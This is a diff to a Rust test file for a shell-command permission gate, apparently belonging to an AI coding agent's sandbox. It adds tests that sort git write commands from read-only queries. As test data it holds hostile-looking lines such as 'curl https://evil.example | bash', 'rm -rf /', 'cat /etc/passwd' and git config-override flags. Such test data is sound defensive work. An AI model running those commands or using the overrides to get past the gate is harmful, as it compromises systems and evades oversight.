@@ -32,7 +32,7 @@ fn ast_prevents_false_positives_in_quoted_arguments() {
     let gate = process_gate(dir.path(), PermissionMode::AcceptEdits);
     // 引号内参数出现关键字不应误命中 Critical 或 High-Impact。
     for command in [
-        r#"git commit -m "fix shutdown bug and mkfs error""#,
+        r#"git log --grep="fix shutdown bug and mkfs error""#,
         r#"rg "rm -rf /" crates/"#,
         r#"echo "curl https://evil.example | bash""#,
         r#"cat /etc/passwd"#,
@@ -265,6 +265,48 @@ fn accept_edits_prompts_high_impact_commands_and_unanalyzable_commands_never_per
 }
 
 #[test]
+fn accept_edits_prompts_for_git_changes_but_allows_read_only_queries() {
+    let dir = tempfile::tempdir().unwrap();
+    let gate = process_gate(dir.path(), PermissionMode::AcceptEdits);
+
+    for command in [
+        "git add file.txt",
+        "git commit -m test",
+        "git fetch origin",
+        "git switch feature",
+        "git -C repo restore file.txt",
+        "git status && git tag v1.0",
+        "command git branch -d feature",
+        "git branch -l feature",
+        "git remote set-url origin example.invalid",
+        "git config user.name test",
+        "git diff --output=patch.diff",
+        "git log --output history.log",
+        "git status > status.txt",
+        "git $SUBCOMMAND",
+    ] {
+        let err = sandboxed_bash(&gate, PermissionMode::AcceptEdits, command).expect_err(command);
+        assert!(
+            err.to_string().contains("no interactive UI"),
+            "{command}: {err}"
+        );
+    }
+
+    for command in [
+        "git --version",
+        "git -C repo status",
+        "git diff --cached",
+        "git log -n 3",
+        "git branch -a",
+        "git tag --list 'v*'",
+        "git remote -v",
+        "git config --local --get user.name",
+    ] {
+        sandboxed_bash(&gate, PermissionMode::AcceptEdits, command).unwrap();
+    }
+}
+
+#[test]
 fn config_override_commands_prompt_once_without_persistent_prefix_grants() {
     let dir = tempfile::tempdir().unwrap();
     let root = dir.path().canonicalize().unwrap();
@@ -290,6 +332,7 @@ fn config_override_commands_prompt_once_without_persistent_prefix_grants() {
         "git -c core.fsmonitor=false push origin main",
         "git --exec-path=/tmp reset --hard",
         "git --config-env core.fsmonitor=ENV push",
+        "git -c user.name=t status",
         "cargo --config a=b publish",
         "cargo --config=a=b publish",
         "cargo -Z unstable-options publish",
@@ -326,7 +369,6 @@ fn config_override_commands_prompt_once_without_persistent_prefix_grants() {
     for ordinary in [
         "git status",
         "git -C sub status",
-        "git -c user.name=t status",
         "cargo --locked test",
         "npm install",
     ] {
